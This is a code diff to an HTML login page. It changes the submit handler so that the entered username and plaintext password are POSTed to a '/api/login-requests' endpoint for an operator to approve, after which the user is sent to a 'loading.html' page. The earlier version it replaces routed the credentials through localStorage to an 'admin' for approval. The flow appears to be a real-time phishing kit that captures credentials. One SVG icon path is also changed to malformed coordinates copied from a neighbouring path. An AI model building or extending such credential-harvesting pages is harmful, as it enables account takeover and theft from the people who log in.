@@ -400,7 +400,7 @@
                 <path d="M50.323 31.484c-0.129 0-0.323-0.064-0.452-0.194-2.452-2.323-5.226-4.194-8.258-5.677-0.323-0.129-0.452-0.516-0.323-0.839s0.516-0.452 0.839-0.323c3.097 1.548 6 3.548 8.516 5.936 0.258 0.258 0.258 0.645 0 0.903 0 0.129-0.129 0.194-0.323 0.194z"></path>
                 <path d="M13.613 31.419c-0.194 0-0.323-0.064-0.452-0.194-0.258-0.258-0.258-0.645 0-0.903 2.129-2 9.677-8.452 18.774-8.452 2 0 4 0.323 5.935 0.903 0.323 0.129 0.516 0.452 0.452 0.774-0.129 0.323-0.452 0.516-0.774 0.452-1.806-0.516-3.677-0.839-5.548-0.839-8.581 0-15.871 6.194-17.936 8.129-0.129 0.129-0.258 0.129-0.452 0.129z"></path>
                 <path d="M22.064 39.677c-0.064 0-0.194 0-0.258-0.065-3.161-1.548-6-3.548-8.581-5.935-0.258-0.258-0.258-0.645-0.065-0.903 0.258-0.258 0.645-0.258 0.903-0.065 2.452 2.323 5.226 4.194 8.258 5.677 0.323 0.129 0.452 0.516 0.323 0.839s-0.323 0.516-0.581 0.516z"></path>
-                <path d="M27.097 34.645c-0.258 0-0.516-0.129-0.581-0.387-0.258-0.71-0.452-1.484-0.452-2.194 0-3.29 2.645-5.936 5.871-5.936 0 0 0 0 0 0 0.774 0 1.484 0.129 2.194 0.452 0.323 0.129 0.516 0.516 0.387 0.839s-0.516 0.516-0.839 0.387c-0.581-0.258-1.161-0.323-1.742-0.323-2.581 0-4.645 2.064-4.645 4.645 0 0.581 0.129 1.161 0.323 1.742 0.129 0.323 0 0.71-0.323 0.839 0-0.065-0.129-0.065-0.194-0.065z"></path>
+                <path d="M27.097 34.645c-0.258 0-0.516-0.129-0.581-0.387-0.258-0.71-0.452-1.484-0.452-2.194 0-3.29 2.645-5.936 5.871-5.936 0 0 0 0 0 0 0.774 0 1.484 0.129 2.194 0.452 0.323 0.129 0.516 0.516 0.387 0.839s-0.516 0.516-0.839 0.387-1.097 0.452-2.323 0.452-2.065-0.452-2.516-2.452-0.516-1.161-0.516-2.387 0.065-3.548-0.129-0.323 0-0.71 0.387-0.839 0.323-0.129 0.71 0 0.839 0.387 0.581 1.484 0.581 3.097-0.065 4.516s-1.806 2.581-3.226 3.161c-0.774 0.258-1.484 0.387-2.194 0.387z"></path>
                 <path d="M32 37.935c-0.71 0-1.484-0.129-2.194-0.387-0.323-0.129-0.516-0.516-0.387-0.839s0.516-0.516 0.839-0.387 1.097 0.452 2.323 0.452 2.065-0.452 2.516-2.452 0.516-1.161 0.516-2.387 0.065-3.548-0.129-0.323 0-0.71 0.387-0.839 0.323-0.129 0.71 0 0.839 0.387 0.581 1.484 0.581 3.097-0.065 4.516s-1.806 2.581-3.226 3.161c-0.774 0.258-1.484 0.387-2.194 0.387z"></path>
                 <path d="M32.065 42.129c-2 0-4-0.323-5.936-0.903-0.323-0.129-0.516-0.452-0.452-0.774 0.129-0.323 0.452-0.516 0.774-0.452 1.806 0.516 3.677 0.839 5.548 0.839 8.581 0 15.871-6.194 17.871-8.129 0.258-0.258 0.645-0.258 0.903 0s0.258 0.645 0 0.903c-2.065 2.065-9.677 8.516-18.71 8.516z"></path>
             </symbol>
@@ -477,46 +477,29 @@
                         const username = $("#Username").val();
                         const password = $("#Password").val();
                         
-                        // Create a unique request ID
-                        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                        
-                        // Store login request in localStorage
-                        const loginRequest = {
-                            id: requestId,
-                            username: username,
-                            password: password,
-                            timestamp: new Date().toISOString(),
-                            status: 'pending',
-                            ip: '192.168.1.100'
-                        };
-                        
-                        // Save request to localStorage
-                        localStorage.setItem('loginRequest_' + requestId, JSON.stringify(loginRequest));
-                        
-                        // Listen for approval/rejection
-                        const checkResponse = setInterval(() => {
-                            const response = localStorage.getItem('loginResponse_' + requestId);
-                            if (response) {
-                                clearInterval(checkResponse);
-                                const responseData = JSON.parse(response);
-                                
-                                // Remove the request and response from localStorage
-                                localStorage.removeItem('loginRequest_' + requestId);
-                                localStorage.removeItem('loginResponse_' + requestId);
-                                
-                                if (responseData.status === 'approved') {
-                                    // Redirect to success/loading page
-                                    window.location.href = `loading.html?username=${encodeURIComponent(username)}&status=approved`;
-                                } else {
-                                    // Show rejection message
-                                    $("#ddid-spinner").hide();
-                                    $("#btnLogin").attr("disabled", false);
-                                    $("#btnLogin").removeClass("btn-gray");
-                                    $("#btnLogin").addClass("btn-primary");
-                                    alert("Login request rejected by admin.");
-                                }
+                        // Send login request to server
+                        $.ajax({
+                            url: '/api/login-requests',
+                            method: 'POST',
+                            contentType: 'application/json',
+                            data: JSON.stringify({
+                                username: username,
+                                password: password,
+                                ipAddress: '192.168.1.100' // In a real app, you'd get the actual IP
+                            }),
+                            success: function(data) {
+                                // Redirect to loading page with request ID
+                                window.location.href = `loading.html?requestId=${data.id}`;
+                            },
+                            error: function(xhr, status, error) {
+                                console.error('Error submitting login request:', error);
+                                $("#ddid-spinner").hide();
+                                $("#btnLogin").attr("disabled", false);
+                                $("#btnLogin").removeClass("btn-gray");
+                                $("#btnLogin").addClass("btn-primary");
+                                alert("Error submitting login request. Please try again.");
                             }
-                        }, 1000);
+                        });
                         
                         return false;
                     }
